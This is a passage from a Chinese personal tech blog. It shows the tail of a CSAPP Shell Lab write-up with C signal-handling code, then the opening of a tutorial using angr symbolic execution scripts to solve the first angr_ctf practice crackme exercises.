class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> jid;</span><br><span class="line">	<span class="keyword">pid_t</span> pid;	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span>	<span class="comment">//单独的job指针 </span></span><br><span class="line">	<span class="keyword">sigset_t</span> mask,prev;	<span class="comment">//修改job之前阻塞所有信号</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(argv[<span class="number">1</span>] == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s command requires PID or %%jobid argument\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">sscanf</span>(argv[<span class="number">1</span>],<span class="string">&quot;%%%d&quot;</span>,&amp;jid) &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		job = getjobjid(jobs,jid);</span><br><span class="line">		<span class="keyword">if</span>(job == <span class="literal">NULL</span> || job-&gt;state == UNDEF)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s: No such job\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">sscanf</span>(argv[<span class="number">1</span>],<span class="string">&quot;%d&quot;</span>,&amp;pid) &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		job = getjobpid(jobs, pid);</span><br><span class="line">		<span class="keyword">if</span>(job == <span class="literal">NULL</span> || job-&gt;state == UNDEF)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;(%s): No such process\n&quot;</span>, argv[<span class="number">1</span>]);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s: argument must be a PID or %%jobid\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//上面的都是在排除异常情况</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//修改job状态</span></span><br><span class="line">	sigfillset(&amp;mask);</span><br><span class="line">	sigprocmask(SIG_BLOCK,&amp;mask,&amp;prev);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>))</span><br><span class="line">		job-&gt;state = FG;</span><br><span class="line">	<span class="keyword">else</span>	</span><br><span class="line">		job-&gt;state = BG;</span><br><span class="line">	</span><br><span class="line">	sigprocmask(SIG_SETMASK,&amp;prev,<span class="literal">NULL</span>);</span><br><span class="line">	</span><br><span class="line">	pid = job-&gt;pid;</span><br><span class="line">	kill(-pid,SIGCONT); <span class="comment">//负的则发送给进程组</span></span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">&quot;fg&quot;</span>))</span><br><span class="line">		waitfg(pid);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[%d] (%d) %s&quot;</span>, job-&gt;jid, pid, job-&gt;cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="IV-waitfg"><a href="#IV-waitfg" class="headerlink" title="IV . waitfg"></a>IV . waitfg</h2><p>等待前台作业完成就使用sleep挂起：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(pid == fgpid(jobs))</span><br><span class="line">		sleep(<span class="number">1</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<h2 id="V-sigint-handler"><a href="#V-sigint-handler" class="headerlink" title="V . sigint_handler"></a>V . sigint_handler</h2><p>当使用 Ctrl+c ，内核发送中断信号给这个Shell程序，而Shell程序通过kill发送信号给子进程，而停止信号也同理；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> old_errno = errno;	<span class="comment">//首先需要保存原始的errno</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(pid!=<span class="number">0</span>)</span><br><span class="line">        kill(-pid,sig);</span><br><span class="line">    </span><br><span class="line">	errno = old_errno; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>保存之前的errno并在返回时重新赋值，是为了防止它被改变；</p>
<h2 id="VI-sigstp-handler"><a href="#VI-sigstp-handler" class="headerlink" title="VI . sigstp_handler"></a>VI . sigstp_handler</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> old_errno = errno;	<span class="comment">//首先需要保存原始的errno</span></span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span>(pid!=<span class="number">0</span>)</span><br><span class="line">        kill(-pid,sig);</span><br><span class="line">        </span><br><span class="line">	errno = old_errno; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="VII-sigchld-handler"><a href="#VII-sigchld-handler" class="headerlink" title="VII . sigchld_handler"></a>VII . sigchld_handler</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> old_errno = errno;	<span class="comment">//首先需要保存原始的errno</span></span><br><span class="line">	<span class="keyword">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line">	<span class="keyword">int</span> state;	<span class="comment">//保存waitpid的状态，用来判断子进程是终止还是停止</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">	</span><br><span class="line">	sigfillset(&amp;mask);</span><br><span class="line">	<span class="comment">//由于信号不存在队列，而waitpid一次只会回收一个子进程，所以用while</span></span><br><span class="line">	<span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;state, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)	<span class="comment">//要检查停止和终止的，并且不要卡在这个循环中</span></span><br><span class="line">    &#123;	</span><br><span class="line">		<span class="comment">//对全局结构变量jobs进行修改时，要阻塞所有信号</span></span><br><span class="line">		sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">		<span class="keyword">if</span>(WIFEXITED(state))	<span class="comment">//子进程通过调用exit或return正常终止，需要从jobs中删除该作业</span></span><br><span class="line">         &#123;	</span><br><span class="line">			deletejob(jobs, pid);</span><br><span class="line">		&#125;</span><br><span class="line">         <span class="keyword">else</span> <span class="keyword">if</span>(WIFSIGNALED(state))	<span class="comment">//子进程因为一个未捕获的信号终止</span></span><br><span class="line">         &#123;	</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) terminated by signal %d\n&quot;</span>, pid2jid(pid), pid, WTERMSIG(state));		</span><br><span class="line">			deletejob(jobs, pid);</span><br><span class="line">		&#125;</span><br><span class="line">         <span class="keyword">else</span> <span class="keyword">if</span>(WIFSTOPPED(state))	<span class="comment">//如果子进程是停止的，需要修改改作业的状态</span></span><br><span class="line">         &#123;	</span><br><span class="line">			job = getjobpid(jobs, pid);</span><br><span class="line">			job-&gt;state = ST;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Job [%d] (%d) stopped by signal %d\n&quot;</span>, job-&gt;jid, pid, WSTOPSIG(state));</span><br><span class="line">		&#125;</span><br><span class="line">		sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);	<span class="comment">//恢复信号接收</span></span><br><span class="line">	&#125;</span><br><span class="line">	errno = old_errno;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这个实验主要是考察了安全信号处理内容，以及竞争关系；</p>
<p>帮助疏通了对Shell的理解：接受指令，处理指令，以及增加进程和如何回收进程；</p>
<p>对于小方向的话便是细节的考虑，阻塞顺序以及分类情况；</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://secondbc.github.io/SecondBC/2022/04/23/Shell-Lab/" data-id="cl2bli06t00007svc3b735rrq" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-Angr-Lab" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/SecondBC/2022/03/31/Angr-Lab/" class="article-date">
  <time datetime="2022-03-31T04:22:58.000Z" itemprop="datePublished">2022-03-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/SecondBC/2022/03/31/Angr-Lab/">Angr.Lab</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p><img src="https://s2.loli.net/2022/03/30/hbgQv6Ia4yrLf7n.jpg" alt="EldenRing"></p>
<h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>angr是一款针对于CTF的工具，说实话并不觉的它对复杂的逆向程序有什么更优的作用；</p>
<p>它的常用功能则是根据使用者自己写的求解约束，附加在程序上计算如何输入进而求出得到的效果来获取正确输入，类似一款爆破计算器；</p>
<p>如何下载呢？ 终端输入 -&gt; pip install angr；</p>
<p>具体的练习上手题则需要去GitHub上搜寻：<a target="_blank" rel="noopener" href="https://github.com/jakespringer/angr_ctf%EF%BC%9B">https://github.com/jakespringer/angr_ctf；</a></p>
<h2 id="主要内容："><a href="#主要内容：" class="headerlink" title="主要内容："></a>主要内容：</h2><p>Project -&gt; 附加的程序，在angr里叫项目；</p>
<p>State -&gt; 状态，模拟的PC所指；</p>
<p>Simulation -&gt; 模拟空间，为状态不断更新使程序执行指令，模拟运行所提供空间；</p>
<p>Explore -&gt; 模拟运行程序并附加内容；</p>
<p>这4个便是angr使用的主要内容，基本解题脚本都离不开这4个，接下来就用GitHub上的题目来一一解释使用方法，以及进阶内容；</p>
<h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><p>IDA分析：</p>
<p><img src="https://s2.loli.net/2022/03/30/8Z4CAd5jameBzDf.png" alt="main"></p>
<p>一个很简单的函数，按照介绍所说，需要让angr帮忙计算出输入的内容就是这里的比较数据：FPQPMQXT；那要怎么去写约束得到正确的输入呢？当然是要让状态走到输出’Good Job.’这一条，而不能走向’Try again.’；如此一来输入只能是比较数据；所以找到这条指令的地址：</p>
<p><img src="https://s2.loli.net/2022/03/30/T54nzFD2HIkCuKZ.png" alt="address"></p>
<p>接下来就可以写执行脚本了：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    <span class="comment"># 目标文件的路径</span></span><br><span class="line">    path_to_binary = <span class="string">&#x27;../program/00_angr_find&#x27;</span></span><br><span class="line">    <span class="comment"># 创建angr项目</span></span><br><span class="line">    project = angr.Project(path_to_binary)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置项目起点，entry_state代表程序的入口点，即main函数</span></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line">    <span class="comment"># 设置模拟器</span></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置目标地址</span></span><br><span class="line">    print_good_addr = <span class="number">0x0804867D</span></span><br><span class="line">    simulation.explore(find=print_good_addr)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果到达目标地址，打印此时的符号向量</span></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="comment"># 否者抛出失败异常</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find solution&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>运用sys库是需要得到标准输入 -&gt; sys.stdin.fileno() ；</p>
<p>angr.Project(执行的二进制文件地址)  -&gt;  打开二进制文件；</p>
<p>project.factory.entry_state()  -&gt;  创建空白的执行环境；</p>
<p>project.factory.simgr(上下文对象)  -&gt;  创建模拟器；</p>
<p>simulation.explore(find = 搜索程序执行路径的地址)  -&gt;  执行路径探索；</p>
</blockquote>
<h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><p>这道题和00其实很像，只是在main函数里塞了很多大量的垃圾代码，直接用find输出正确的地址就找不到；</p>
<p>看到maybe_good函数：</p>
<p><img src="https://s2.loli.net/2022/03/30/J2PwhoM1bspqk9i.png" alt="function"></p>
<p>以及在main函数里经常出现的avoid_me函数：</p>
<p><img src="https://s2.loli.net/2022/03/30/xlSMaPVQiojsZ9E.png" alt="function"></p>
<p>可以知道，如果进入了avoid_me后，再进入maybe_good就与输出Good Job无缘了，所以在寻找怎样输入才能导致输出正确的时候，可以再加一个约束，约束状态不要进入avoid_me；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    <span class="comment"># 目标文件的路径</span></span><br><span class="line">    path_to_binary = <span class="string">&#x27;../program/01_angr_avoid&#x27;</span></span><br><span class="line">    <span class="comment"># 创建angr项目</span></span><br><span class="line">    project = angr.Project(path_to_binary)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置项目起点，entry_state代表程序的入口点，即main函数</span></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line">    <span class="comment"># 设置模拟器</span></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置目标地址</span></span><br><span class="line">    print_good_addr = <span class="number">0x080485E0</span></span><br><span class="line">    aovid_me_addr = <span class="number">0x080485A8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># simulation.explore(find=print_good_addr)</span></span><br><span class="line">    <span class="comment"># avoid=try_again_addr</span></span><br><span class="line">    <span class="comment"># 在这里可以添加 avoid 来约束到达的目的地址 </span></span><br><span class="line">    simulation.explore(find=print_good_addr, avoid=aovid_me_addr)</span><br><span class="line">    <span class="comment"># 如果到达目标地址，打印此时的符号向量</span></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="comment"># 否者抛出失败异常</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find solution&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>simulation.explore(find = 要搜索的路径地址, avoid = 要排除执行路径地址)  -&gt;  路径探索</p>
<p>simulation.found  -&gt;  搜索结果集合,这是一个python list 对象</p>
</blockquote>
<h2 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h2><p>IDA：</p>
<p><img src="https://s2.loli.net/2022/03/30/Dnm1Bj4rKiChJfg.png" alt="main"></p>
<p>与00比较，在进行判断字符串的时候进行了一次运算，而在汇编层可以看到 puts(“Good Job.”) 这条指令来自很多地址，被混淆打乱了：</p>
<p><img src="https://s2.loli.net/2022/03/30/XkHdqKc9r7tuYZS.png" alt="Xrefs"></p>
<p>所以这次不能用 find=地址 来得到要找到的正确输入了；所以需要构建explore() 函数的回调函数；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 到达目标地址，打印此时的符号向量</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">good_job</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Good Job&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(stdout_output)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 否则抛出失败异常</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_again</span>(<span class="params">state</span>):</span> </span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Try again&#x27;</span> <span class="keyword">in</span> <span class="built_in">str</span>(stdout_output)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    path_to_binary = <span class="string">&#x27;./02_angr_find_condition&#x27;</span></span><br><span class="line">    <span class="comment"># 创建angr项目</span></span><br><span class="line">    project = angr.Project(path_to_binary)</span><br><span class="line">    <span class="comment"># 设置项目起点，entry_state代表程序的入口点，即main函数</span></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line">    <span class="comment"># 设置模拟器</span></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    <span class="comment"># 设置目标地址</span></span><br><span class="line">    simulation.explore(find=good_job, avoid=try_again) </span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find solution&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>simulation.explore(find = 回调函数, avoid = 回调函数)  -&gt;  路径探索</p>
<blockquote>
<p>explore() 函数的回调函数格式为:</p>
<p>def recall_explore(state) :</p>
<p>​    …</p>
<p>​    return True / False  #  True 意思是发现了该路径,False 则是忽略</p>
</blockquote>
<p>state.posix.dumps(sys.stdout.fileno())  -&gt;  获取模拟执行的控制台输出</p>
</blockquote>
<h2 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h2><p>IDA：</p>
<p><img src="https://s2.loli.net/2022/03/30/RmAD4btvglsqCJf.png" alt="main"></p>
<p>这次让输入三次内容，三次经过不同的加密，最后经过 if 判断来找结果；</p>
<p>汇编层：</p>
<p><img src="https://s2.loli.net/2022/03/30/h2LQfuzHmk3GMxw.png" alt="asam"></p>
<p>虽然伪代码显示v5，v6，v8都变量都是栈里的数据，但汇编层显示出，它们是由寄存器eax，ebx，edx搬运进栈后才会是对应栈数据；</p>
<p>那么已知运算结果（怎样是正确的输出），以及运算过程由angr自己去运行；那么就需要设未知数进行求解，把寄存器设为未知数的过程，便称为符号化寄存器，也可以叫变量化寄存器；这一步就类似于Z3里的设置未知变量模型了；</p>
<p>这里需要用到一个库：claripy，下载angr自带的；</p>
<p>代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    binary_path = <span class="string">&#x27;../program/03_angr_symbolic_registers&#x27;</span></span><br><span class="line">    project = angr.Project(binary_path)</span><br><span class="line">	</span><br><span class="line">    <span class="comment"># 设置项目开始地址</span></span><br><span class="line">    start_addr = <span class="number">0x0804890E</span></span><br><span class="line">    initial_state = project.factory.blank_state(addr=start_addr)</span><br><span class="line">	</span><br><span class="line">    </span><br><span class="line">   <span class="comment"># 将寄存器符号化</span></span><br><span class="line">    bit_length = <span class="number">32</span></span><br><span class="line">    psd0 = claripy.BVS(<span class="string">&#x27;psd0&#x27;</span>, bit_length)</span><br><span class="line">    psd1 = claripy.BVS(<span class="string">&#x27;psd1&#x27;</span>, bit_length)</span><br><span class="line">    psd2 = claripy.BVS(<span class="string">&#x27;psd2&#x27;</span>, bit_length)</span><br><span class="line">	<span class="comment"># 将符号化的寄存器对应到相应的寄存器</span></span><br><span class="line">    initial_state.regs.eax = psd0</span><br><span class="line">    initial_state.regs.ebx = psd1</span><br><span class="line">    initial_state.regs.edx = psd2</span><br><span class="line">	<span class="comment"># 设置模拟</span></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">good_job</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_content = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stdout_content</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fail</span>(<span class="params">state</span>):</span></span><br><span class="line">        stdout_content = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stdout_content</span><br><span class="line"></span><br><span class="line">    simulation.explore(find=good_job, avoid=fail)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        solution0 = solution_state.se.<span class="built_in">eval</span>(psd0)</span><br><span class="line">        solution1 = solution_state.se.<span class="built_in">eval</span>(psd1)</span><br><span class="line">        solution2 = solution_state.se.<span class="built_in">eval</span>(psd2)</span><br><span class="line"></span><br><span class="line">        solution = <span class="string">&#x27;%x %x %x&#x27;</span> % (solution0, solution1, solution2)</span><br><span class="line">        <span class="built_in">print</span>(solution)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<blockquote>
<p>project.factory.blank_state(addr=start_address)  -&gt;  创建自定义入口的状态上下文</p>
<p>initial_state.regs  -&gt;  操作状态上下文的寄存器</p>
<p>claripy.BVS(‘变量名’, 变量大小)  -&gt;  创建求解变量</p>
<p>solution_state.se.eval(变量)  -&gt;  求解符号变量</p>
<p>solution = ‘%x %x %x’ % (solution0, solution1, solution2) -&gt; 标准输出格式</p>
</blockquote>
<h2 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h2><p>IDA：</p>
<p><img src="https://i.bmp.ovh/imgs/2022/03/30/28c8ec86fc754aea.png" alt="function"></p>
<p>这个函数是main里的唯一一个指令；查看汇编可以发现v1，v2变量不是由寄存器传到栈上，是直接输入的栈上的，那么这次做的便是符号化栈；将栈上的数据设置为未知数，所以需要去平衡栈；</p>
<p>代码：</p>
